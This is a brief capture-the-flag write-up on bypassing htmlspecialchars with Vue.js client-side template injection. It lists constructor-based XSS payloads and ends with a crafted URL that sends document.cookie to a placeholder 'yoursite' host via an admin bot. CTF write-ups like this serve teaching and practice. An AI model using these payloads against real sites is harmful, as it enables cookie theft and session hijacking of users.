# Web - Welcome Page
* Given a link to a website, lets say `target`.
* If we look using view-source, we can find that parameter `msg` are reflected in page but server using php function [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) to prevent XSS.
* On Vue.js we can do XSS without using any html tag, instead we can use `.constructor`.
```
{{_Vue.h.constructor`alert(1)`()}}
{{$emit.constructor`alert(1)`()}}

- Source : 
- https://medium.com/@sid0krypt/vue-js-reflected-xss-fae04c9872d2
- https://vuejs.org/guide/components/events.html#emitting-and-listening-to-events
```
* My payload
```
http://target/?msg={{$emit.constructor`fetch('yoursite/?x='+document.cookie)`()}}
```
* Then, send to admin bot.